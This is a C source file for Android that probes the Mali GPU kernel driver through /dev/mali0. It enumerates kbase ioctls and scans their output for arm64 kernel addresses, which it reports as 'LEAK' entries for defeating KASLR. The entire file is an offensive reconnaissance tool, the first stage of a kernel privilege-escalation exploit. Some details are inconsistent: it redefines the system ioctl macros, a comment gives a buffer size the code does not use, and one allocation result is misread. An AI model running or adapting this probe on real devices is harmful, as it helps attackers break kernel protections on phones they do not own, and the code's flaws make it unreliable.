/*
 * mali_kaslr_probe.c - enumerate mali0 ioctls to find kernel pointer leaks
 * Compile: aarch64-linux-android35-clang -O2 -o mali_kaslr_probe mali_kaslr_probe.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <stdint.h>

/* Linux ioctl encoding */
#define _IOC(dir,type,nr,size) \
    (((dir) << 30) | ((size) << 16) | ((type) << 8) | (nr))
#define _IO(type,nr)        _IOC(0,(type),(nr),0)
#define _IOR(type,nr,size)  _IOC(1,(type),(nr),sizeof(size))
#define _IOW(type,nr,size)  _IOC(2,(type),(nr),sizeof(size))
#define _IOWR(type,nr,size) _IOC(3,(type),(nr),sizeof(size))
#define _IOC_DIR(nr)        (((nr) >> 30) & 0x3)
#define _IOC_TYPE(nr)       (((nr) >> 8) & 0xff)
#define _IOC_NR(nr)         ((nr) & 0xff)
#define _IOC_SIZE(nr)       (((nr) >> 16) & 0x3fff)

/* Mali kbase ioctls */
#define KBASE_IOCTL_TYPE 0x80

/* version struct */
struct kbase_ioctl_version {
    __u16 major;
    __u16 minor;
};

/* property query */
struct kbase_ioctl_get_gpuprops {
    __u64 buffer;
    __u32 size;
    __u32 flags;
};

/* mem_alloc */
struct kbase_ioctl_mem_alloc {
    __u64 va_pages;
    __u64 commit_pages;
    __u64 extension;   /* also flags in newer */
    __u8  type;
    __u8  padding[7];
};

/* GPU property IDs (common across mali kbase versions) */
#define KBASE_GPUPROP_PRODUCT_ID                0x01
#define KBASE_GPUPROP_VERSION_STATUS             0x02
#define KBASE_GPUPROP_MINOR_REVISION             0x03
#define KBASE_GPUPROP_MAJOR_REVISION             0x04
#define KBASE_GPUPROP_GPU_SPEED_MHZ             0x11
#define KBASE_GPUPROP_GPU_FREQ_KHZ_MAX          0x12
#define KBASE_GPUPROP_LOG2_PROGRAM_COUNTER_SIZE 0x15
#define KBASE_GPUPROP_TEXTURE_FEATURES_0        0x20
#define KBASE_GPUPROP_GPU_AVAILABLE_MEMORY_SIZE  0x50
#define KBASE_GPUPROP_L2_SLICES                 0x51

struct gpu_props {
    __u32 product_id;
    __u32 minor_revision;
    __u32 major_revision;
    __u32 gpu_speed_mhz;
    __u32 gpu_freq_khz_max;
    __u64 texture_features[3];
    __u64 gpu_available_memory_size;
    __u32 l2_slices;
    /* more fields follow... */
    char padding[4096];
};

static int has_kernel_ptr(uint64_t val) {
    /* canonical kernel addresses on arm64 */
    if ((val >> 32) == 0xffffffff || (val >> 32) == 0xffffff80 ||
        (val >> 32) == 0xffffffe0 || (val >> 32) == 0xffffffe1 ||
        (val >> 32) == 0xffffffe2 || (val >> 32) == 0xffffffe3 ||
        (val >> 32) == 0xffffffe4 || (val >> 32) == 0xffffffe5 ||
        (val >> 32) == 0xffffffe6 || (val >> 32) == 0xffffffe7 ||
        (val >> 36) == 0xfffffffe) {
        return 1;
    }
    return 0;
}

static void scan_for_pointers(const void *buf, size_t len, const char *label) {
    const uint64_t *p = (const uint64_t *)buf;
    size_t count = len / sizeof(uint64_t);
    for (size_t i = 0; i < count; i++) {
        if (p[i] != 0 && has_kernel_ptr(p[i])) {
            printf("  LEAK[%s] offset=0x%zx val=0x%016llx\n",
                   label, i * 8, (unsigned long long)p[i]);
        }
    }
}

static void hexdump(const void *buf, size_t len, const char *label, int show_ptr_scan) {
    const uint8_t *p = (const uint8_t *)buf;
    size_t shown = 0;
    printf("--- %s (len=%zu) ---\n", label, len);
    for (size_t i = 0; i < len && shown < 128; i += 16) {
        printf("  %04zx: ", i);
        for (size_t j = 0; j < 16 && i + j < len; j++)
            printf("%02x ", p[i + j]);
        printf("\n");
        shown += 16;
    }
    if (len > 128) printf("  ... (truncated)\n");
    if (show_ptr_scan) scan_for_pointers(buf, len, label);
}

int main(int argc, char **argv) {
    int fd = open("/dev/mali0", O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "Cannot open /dev/mali0: %s (errno=%d)\n",
                strerror(errno), errno);
        return 1;
    }
    printf("Opened /dev/mali0 fd=%d\n", fd);

    /* 1. Version */
    struct kbase_ioctl_version ver = {0};
    int ret = ioctl(fd, _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version), &ver);
    printf("\n[VERSION] ret=%d major=%u minor=%u errno=%s\n",
           ret, ver.major, ver.minor, ret < 0 ? strerror(errno) : "ok");

    /* 2. GET_GPUPROPS - allocate large buffer and scan for pointers */
    size_t props_sz = 8192;
    void *props_buf = calloc(1, props_sz);
    if (props_buf) {
        struct kbase_ioctl_get_gpuprops gprops = {
            .buffer = (uint64_t)(uintptr_t)props_buf,
            .size = props_sz,
            .flags = 0
        };
        ret = ioctl(fd, _IOWR(KBASE_IOCTL_TYPE, 2, struct kbase_ioctl_get_gpuprops), &gprops);
        printf("\n[GET_GPUPROPS] ret=%d size_used=%u errno=%s\n",
               ret, gprops.size, ret < 0 ? strerror(errno) : "ok");
        if (ret == 0) {
            hexdump(props_buf, gprops.size > 512 ? 512 : gprops.size,
                    "gpuprops", 1);
            scan_for_pointers(props_buf, gprops.size, "gpuprops-full");
        }
        free(props_buf);
    }

    /* 3. Try KBASE_IOCTL_MEM_ALLOC with various flags/types */
    struct kbase_ioctl_mem_alloc alloc = {0};
    alloc.va_pages = 1;
    alloc.commit_pages = 1;
    alloc.extension = 0;
    alloc.type = 0;
    ret = ioctl(fd, _IOWR(KBASE_IOCTL_TYPE, 5, struct kbase_ioctl_mem_alloc), &alloc);
    printf("\n[MEM_ALLOC type=0] ret=%d errno=%s\n",
           ret, ret < 0 ? strerror(errno) : "ok");
    if (ret == 0) {
        printf("  va_result=0x%llx\n", (unsigned long long)alloc.va_pages);
    }

    /* 4. Try various ioctls to find any that return pointers */
    printf("\n[ENUMERATE IOCTLS] Testing base=0x80 type...\n");
    for (int nr = 0; nr < 64; nr++) {
        /* Skip already-tested ones */
        if (nr == 0 || nr == 2 || nr == 5) continue;

        /* Try _IOWR with a 64-byte buffer */
        char buf[256];
        memset(buf, 0, sizeof(buf));
        /* Try encoding as _IOWR with size 64 */
        unsigned int cmd = _IOWR(KBASE_IOCTL_TYPE, nr, uint64_t);
        errno = 0;
        ret = ioctl(fd, cmd, buf);
        int e = errno;
        if (ret == 0 || e != ENOTTY) {
            printf("  ioctl(type=0x%02x, nr=%d, dir=%d, size=%d) ret=%d errno=%d(%s)\n",
                   KBASE_IOCTL_TYPE, nr, _IOC_DIR(cmd), _IOC_SIZE(cmd),
                   ret, e, strerror(e));
            if (ret == 0) {
                hexdump(buf, 32, "result", 1);
            }
        }

        /* Also try _IOR */
        cmd = _IOR(KBASE_IOCTL_TYPE, nr, uint64_t);
        errno = 0;
        ret = ioctl(fd, cmd, buf);
        e = errno;
        if (ret == 0 || (e != ENOTTY && e != EINVAL)) {
            printf("  ioctl(type=0x%02x, nr=%d, dir=%d, size=%d) ret=%d errno=%d(%s) [_IOR]\n",
                   KBASE_IOCTL_TYPE, nr, _IOC_DIR(cmd), _IOC_SIZE(cmd),
                   ret, e, strerror(e));
            if (ret == 0) {
                hexdump(buf, 32, "result-IOR", 1);
            }
        }
    }

    /* 5. Try SET_FLAGS (nr=1) with a flags value */
    __u64 flags = 0;
    ret = ioctl(fd, _IOW(KBASE_IOCTL_TYPE, 1, __u64), &flags);
    printf("\n[SET_FLAGS=0] ret=%d errno=%s\n", ret, ret < 0 ? strerror(errno) : "ok");

    /* 6. Try KBASE_IOCTL_GET_CONTEXT_ID (nr=3) */
    __u32 ctx_id = 0;
    ret = ioctl(fd, _IOR(KBASE_IOCTL_TYPE, 3, __u32), &ctx_id);
    printf("\n[GET_CONTEXT_ID] ret=%d ctx_id=%u errno=%s\n",
           ret, ctx_id, ret < 0 ? strerror(errno) : "ok");

    /* 7. Try MEM_QUERY (nr=14) with different offsets */
    struct { __u64 offset; __u64 size; __u64 flags; } query;
    query.offset = 0;
    query.size = 4096;
    query.flags = 0;
    ret = ioctl(fd, _IOWR(KBASE_IOCTL_TYPE, 14, typeof(query)), &query);
    printf("\n[MEM_QUERY off=0] ret=%d size=%llu flags=%llu errno=%s\n",
           ret, (unsigned long long)query.size,
           (unsigned long long)query.flags,
           ret < 0 ? strerror(errno) : "ok");

    close(fd);
    printf("\nDone.\n");
    return 0;
}
